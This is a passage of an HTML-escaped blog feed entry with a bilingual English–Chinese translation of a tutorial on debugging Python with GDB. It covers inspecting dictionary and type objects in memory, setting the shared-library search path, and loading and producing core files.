+&lt;h3 id=&quot;accessing-dictionaries--存取字典&quot;&gt;Accessing Dictionaries / 存取字典&lt;/h3&gt;
+
+&lt;p&gt;Finally, what about something more detailed? Let’s look at the dictionary passed here.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;最終，那更詳細的呢。讓我們看一下這裡的字典傳遞。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) p *((PyDictObject*)args[3])
+$51 = {ob_refcnt = 3, ob_type = 0x81854a0, ma_fill = 4, ma_used = 4, ma_mask = 7,
+  ma_table = 0xf7d8aa60, ma_lookup = 0x808c70c , ma_smalltable = {
+   {me_hash = 435549560, me_key = 0xf7dc44e0, me_value = 0xf7d9b4fc},
+   {me_hash = 0, me_key = 0x0, me_value = 0x0},
+   {me_hash = 1333480578, me_key = 0xf7dc2a20, me_value = 0xf7d9d5a0},
+   {me_hash = -1120181165,me_key = 0xf7dc2688, me_value = 0xf7dc132c},
+   {me_hash = 1733367940, me_key = 0xf7d942f0, me_value = 0x81c3e64},
+   {me_hash = 0, me_key = 0x0, me_value = 0x0},
+   {me_hash = 0, me_key = 0x0, me_value = 0x0},
+   {me_hash = 0, me_key = 0x0, me_value = 0x0}}}
+(gdb)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;What’s all of this me business? Let’s look at one of the items in the hash table representing the dictionary.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;這一團 me 是怎麼回事？讓我們看一下用雜湊表來表示的字典中的其中一個項目。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) p *((PyTypeObject*)((PyDictObject*)args[3])-&amp;gt;ma_smalltable[2].me_key.ob_type)
+$64 = {ob_refcnt = 71, ob_type = 0x818a940, ob_size = 0, tp_name = 0x8158d74 &quot;str&quot;,
+  tp_basicsize = 24, tp_itemsize = 1, tp_dealloc = 0x809d982 ,
+  tp_print = 0x809d74c , tp_getattr = 0, tp_setattr = 0, tp_compare = 0,
+  tp_repr = 0x809ec77 , tp_as_number = 0x8187fe0, tp_as_sequence = 0x8188080,
+  tp_as_mapping = 0x81880a8, tp_hash = 0x809c5a9 , tp_call = 0, tp_str = 0x809e602 ,
+  tp_getattro = 0x8091091 ,
+  tp_setattro = 0x8090e1a , tp_as_buffer = 0x81880b4, tp_flags = 136713723,
+  tp_doc = 0x81880e0
+   &quot;str(object) -&amp;gt; string\n\nReturn a nice string representation of the object.\n
+        If the argument is a string, the return value is the same object.&quot;,
+  tp_traverse = 0,
+  tp_clear = 0, tp_richcompare = 0x809cd84 , tp_weaklistoffset = 0, tp_iter = 0,
+  tp_iternext = 0, tp_methods = 0x8188180, tp_members = 0x0, tp_getset = 0x0,
+  tp_base = 0x8187c00, tp_dict = 0xf7dc34f4, tp_descr_get = 0, tp_descr_set = 0,
+  tp_dictoffset = 0, tp_init = 0x80ac582 , tp_alloc = 0x80ad345 ,
+  tp_new = 0x80a2fcc , tp_free = 0x8094510 , tp_is_gc = 0, tp_bases = 0xf7dc4f0c,
+  tp_mro = 0xf7dc7fa4, tp_cache = 0x0, tp_subclasses = 0x0,
+  tp_weaklist = 0xf7dc7fcc, tp_del = 0, tp_version_tag = 0}
+(gdb)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Excellent. The key type is a string. What’s the value?&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;不錯喔。主要的型態是一個字串。那值是什麼？&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) x/s ((PyStringObject *)((PyTypeObject*)((
+    PyDictObject*)args[3])-&amp;gt;ma_smalltable[2].me_value)).ob_sval
+0xf7d9d5b4: &quot;_abcoll&quot;
+(gdb)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The value of this entry is the string “_abcoll.” Note that the key type doesn’t reference the value type. I left out the step in which I looked up the value’s type.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;這個項目的值是字串 “_abcoll.” 注意這個主要型態沒有參考值型態。我忽略的搜尋值得型態的步驟。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;closing-notes--結語&quot;&gt;Closing Notes / 結語&lt;/h3&gt;
+
+&lt;p&gt;The most important step in understanding how to do this is having Python source available. You’re debugging a C program here; you want to access structure members and fields.  Given the above knowledge, you should be able to walk through and display information about almost any Python object in memory. A big help.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;了解如何做這些事情最重要的步驟是擁有一份 Python 原始碼。你在這裡除錯 C 程式語言;你想要存取結構成員與欄位。考慮到上述的知識，你應當可以檢視並顯示有關幾乎任何在記憶體中的 Python 物件。一個大大的幫助。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;what-about-the-shared-libraries---那有關分享函式庫呢-&quot;&gt;What about the shared libraries ? / 那有關分享函式庫呢 ?&lt;/h3&gt;
+
+&lt;p&gt;If you’re referencing shared object files that aren’t in standard library paths, you can add them to your GDB shared object search path from your local directory as follows:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;如果你正參考到不在標準函式路徑中的分享函式庫目的檔，你可以將他們從本地目錄加到你的 GDB shared object search path 如下:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.so&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;do
+    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dirname&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;uniq&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;n : | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s#\./#'&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PWD&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'#g'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And then …&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;然後 …&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) set solib-search-path &amp;lt;the above output&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As always, you should ensure these are the same versions that you’re running or that may be referenced in a core.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;如同平常一樣，你需要確定這些正在執行的版本與產生的版本一致。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;what-if-i-have-a-core-file--如果我有一個-core-檔-&quot;&gt;What if I Have a Core File? / 如果我有一個 core 檔 ?&lt;/h3&gt;
+
+&lt;p&gt;You’ll use it like you would with any other debug session:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;你可以如同使用其他 debug session 一樣：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb -c &amp;lt;core&amp;gt; /usr/bin/python
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;All of the standard commands should work at that point: up, down, select, frame, etc…&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;所有的標準命令應該正常運作: up, down, select, frame 等等&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;how-do-i-get-a-core-file---我要怎麼得到一個-core-檔案-&quot;&gt;How do I Get a Core File ? / 我要怎麼得到一個 core 檔案 ?&lt;/h3&gt;
+
+&lt;p&gt;You can force a binary to drop a core by ensuring that the ulimit is set appropriately via ulimit -Sc unlimited. If your core files aren’t where you expect, see man core.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;只要將 ulimit 設定得當，透過 &lt;code class=&quot;highlighter-rouge&quot;&gt;ulimit -Sc unlimited&lt;/code&gt;，就可以強迫一個二進制檔案生成一個 core。如果你的 core 檔案不是你所預期的，請參照 man core(編按: man 是Linux 下的 mannual)。&lt;/p&gt;
+&lt;/blockquote&gt;</content><author><name>jhe</name></author><category term="python" /><category term="gdb" /><summary type="html">Debugging Your Python With GDB (FTW!) 編按：具體文章已遺失，透過網路找到 cache 文章來翻譯</summary></entry></feed>
